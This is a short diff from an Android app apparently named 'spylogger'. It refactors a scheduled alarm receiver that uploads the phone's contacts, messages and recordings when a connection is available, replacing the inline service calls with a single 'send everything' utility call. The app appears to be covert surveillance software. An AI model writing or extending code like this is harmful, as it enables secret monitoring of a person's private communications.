@@ -6,15 +6,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 
-import com.gravatasufoca.spylogger.model.Configuracao;
-import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
-import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
-import com.gravatasufoca.spylogger.services.SendContatosService;
-import com.gravatasufoca.spylogger.services.SendGravacoesService;
-import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.utils.Utils;
-
-import java.sql.SQLException;
 
 public class Alarm extends BroadcastReceiver{
 
@@ -22,28 +14,7 @@ public class Alarm extends BroadcastReceiver{
 
 	@Override
 	 public void onReceive(Context context, Intent intent) {
-		try {
-			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
-
-			Configuracao configuracao= repositorioConfiguracao.getConfiguracao();
-
-			if(configuracao!=null){
-				if(Utils.isConnected(context,configuracao.isWifi())) {
-					SendContatosService sendContatosService = new SendContatosService(context, null);
-					sendContatosService.enviarContatos();
-
-					SendMensagensService sendMensagensService = new SendMensagensService(context, null);
-					sendMensagensService.enviarTopicos();
-
-					SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
-					sendGravacoesService.enviarTopicos();
-				}
-			}
-
-		} catch (SQLException e) {
-			e.printStackTrace();
-		}
-
+		Utils.enviarTudo(context);
 	 }
 
 
